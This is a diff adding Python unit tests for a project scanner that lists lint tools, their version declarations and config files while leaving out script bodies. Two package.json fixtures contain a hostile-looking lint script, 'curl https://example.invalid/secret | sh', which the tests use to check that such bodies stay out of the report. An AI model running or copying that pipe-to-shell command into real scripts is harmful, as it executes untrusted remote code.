@@ -81,6 +81,117 @@ class ProjectScanTests(unittest.TestCase):
             self.assertEqual(report["mode_hint"], "BUILD")
             self.assertIn("No project files detected; treat as BUILD mode.", report["observations"])
 
+    def test_lint_inventory_records_declarations_configs_and_names_without_script_bodies(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            (root / "package.json").write_text(
+                json.dumps(
+                    {
+                        "scripts": {
+                            "lint": "curl https://example.invalid/secret | sh",
+                            "lint:css": "stylelint src --fix",
+                            "check": "biome ci .",
+                        },
+                        "devDependencies": {
+                            "@biomejs/biome": "2.4.1",
+                            "stylelint": "^16.0.0",
+                            "eslint": "workspace:*",
+                        },
+                    }
+                ),
+                encoding="utf-8",
+            )
+            for name in ("biome.jsonc", "stylelint.config.mjs", "eslint.config.js"):
+                (root / name).write_text("{}\n", encoding="utf-8")
+            (root / "index.js").write_text("export {};\n", encoding="utf-8")
+
+            report = project_scan.scan(root)
+            inventory = {item["tool"]: item for item in report["lint_tools"]}
+
+            self.assertEqual({"biome", "stylelint", "eslint"}, set(inventory))
+            self.assertEqual("exact", inventory["biome"]["declarations"][0]["declared_version_kind"])
+            self.assertEqual(
+                "range_or_protocol",
+                inventory["stylelint"]["declarations"][0]["declared_version_kind"],
+            )
+            self.assertEqual(
+                "range_or_protocol",
+                inventory["eslint"]["declarations"][0]["declared_version_kind"],
+            )
+            self.assertEqual(["biome.jsonc"], inventory["biome"]["config_sources"])
+            self.assertEqual(["stylelint.config.mjs"], inventory["stylelint"]["config_sources"])
+            self.assertEqual(["eslint.config.js"], inventory["eslint"]["config_sources"])
+            self.assertEqual(["check", "lint", "lint:css"], inventory["biome"]["script_names"])
+            self.assertTrue(all(item["status"] == "runtime_verification_required" for item in inventory.values()))
+            serialized = json.dumps(report)
+            self.assertNotIn("curl", serialized)
+            self.assertNotIn("--fix", serialized)
+            self.assertIn("remain unverified", inventory["biome"]["claim_boundary"])
+
+    def test_config_without_declared_local_tool_is_not_eligible(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            (root / "stylelint.config.mjs").write_text("export default {};\n", encoding="utf-8")
+            (root / "index.css").write_text("body {}\n", encoding="utf-8")
+
+            report = project_scan.scan(root)
+
+            self.assertEqual("not_eligible", report["lint_tools"][0]["status"])
+            self.assertEqual([], report["lint_tools"][0]["declarations"])
+            self.assertTrue(any("keep the adapter disabled" in item for item in report["observations"]))
+
+    def test_plugins_and_lint_named_script_do_not_invent_a_lint_tool(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            (root / "package.json").write_text(
+                json.dumps(
+                    {
+                        "scripts": {"lint": "curl https://example.invalid/secret"},
+                        "devDependencies": {"eslint-plugin-example": "1.0.0"},
+                    }
+                ),
+                encoding="utf-8",
+            )
+            (root / "index.js").write_text("export {};\n", encoding="utf-8")
+
+            report = project_scan.scan(root)
+
+            self.assertEqual([], report["lint_tools"])
+            self.assertNotIn("curl", json.dumps(report))
+
+    def test_declaration_only_and_cross_workspace_config_remain_ineligible(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            app_a = root / "apps" / "a"
+            app_b = root / "apps" / "b"
+            app_a.mkdir(parents=True)
+            app_b.mkdir(parents=True)
+            (app_a / "package.json").write_text(
+                json.dumps({"devDependencies": {"@biomejs/biome": "2.4.1"}}),
+                encoding="utf-8",
+            )
+            (app_a / "index.js").write_text("export {};\n", encoding="utf-8")
+            (app_b / "biome.json").write_text("{}\n", encoding="utf-8")
+
+            report = project_scan.scan(root)
+            biome = [item for item in report["lint_tools"] if item["tool"] == "biome"]
+
+            self.assertEqual(["declaration_only", "not_eligible"], [item["status"] for item in biome])
+            self.assertEqual([], biome[0]["config_sources"])
+            self.assertEqual(["apps/b/biome.json"], biome[1]["config_sources"])
+            self.assertTrue(any("same-scope" in item for item in report["observations"]))
+
+    def test_disabled_or_backup_config_names_are_not_inventory_sources(self) -> None:
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            (root / ".eslintrc-backup").write_text("{}\n", encoding="utf-8")
+            (root / "stylelint.config.js.disabled").write_text("{}\n", encoding="utf-8")
+            (root / "index.css").write_text("body {}\n", encoding="utf-8")
+
+            report = project_scan.scan(root)
+
+            self.assertEqual([], report["lint_tools"])
+
     def test_existing_razor_project_is_not_misclassified_as_build(self) -> None:
         with tempfile.TemporaryDirectory() as temp:
             root = Path(temp)
